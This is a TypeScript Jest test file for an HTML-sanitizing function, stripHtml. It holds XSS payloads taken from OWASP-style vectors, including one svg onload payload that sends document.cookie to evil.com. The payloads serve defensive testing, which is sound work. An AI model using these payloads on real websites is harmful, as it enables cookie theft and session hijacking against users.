import { stripHtml } from './sanitize';

describe('stripHtml', () => {
  it('should strip HTML tags', () => {
    expect(stripHtml('<script>alert("xss")</script>Hello')).toBe('Hello');
  });

  it('should strip inline tags', () => {
    expect(stripHtml('<b>bold</b> text')).toBe('bold text');
  });

  it('should decode HTML entities', () => {
    expect(stripHtml('&lt;div&gt;test&lt;/div&gt;')).toBe('');
  });

  it('should preserve plain text', () => {
    expect(stripHtml('Hello from Abuja!')).toBe('Hello from Abuja!');
  });

  it('should preserve emojis and unicode', () => {
    expect(stripHtml('Hello 🌍 from Abuja!')).toBe('Hello 🌍 from Abuja!');
    expect(stripHtml('Ẽmoji tëst 日本語')).toBe('Ẽmoji tëst 日本語');
  });

  it('should trim whitespace', () => {
    expect(stripHtml('  hello  ')).toBe('hello');
  });

  it('should handle empty string', () => {
    expect(stripHtml('')).toBe('');
  });

  // XSS vector tests (OWASP cheat sheet)
  it('should block img onerror payload', () => {
    expect(stripHtml('<img src=x onerror="alert(1)">')).toBe('');
  });

  it('should block svg onload payload', () => {
    expect(stripHtml('<svg onload="fetch(\'https://evil.com/?c=\'+document.cookie)">')).toBe('');
  });

  it('should block javascript: URI scheme', () => {
    expect(stripHtml('<a href="javascript:alert(1)">click</a>')).toBe('click');
  });

  it('should block mutation XSS via encoded tags', () => {
    expect(stripHtml('<scr\x00ipt>alert(1)</scr\x00ipt>')).not.toContain('<');
    expect(stripHtml('<scr\x00ipt>alert(1)</scr\x00ipt>')).not.toContain('>');
  });

  it('should block nested/obfuscated script tag', () => {
    expect(stripHtml('<<script>script>alert(1)<</script>/script>')).not.toContain('alert');
  });

  it('should block style-based XSS', () => {
    expect(stripHtml('<style>body{background:url("javascript:alert(1)")}</style>text')).toBe('text');
  });

  it('should block event handler attributes', () => {
    expect(stripHtml('<div onclick="alert(1)">text</div>')).toBe('text');
    expect(stripHtml('<input onfocus="alert(1)">')).toBe('');
  });

  it('should block data: URI injection', () => {
    expect(stripHtml('<img src="data:text/html,<script>alert(1)</script>">')).toBe('');
  });
});
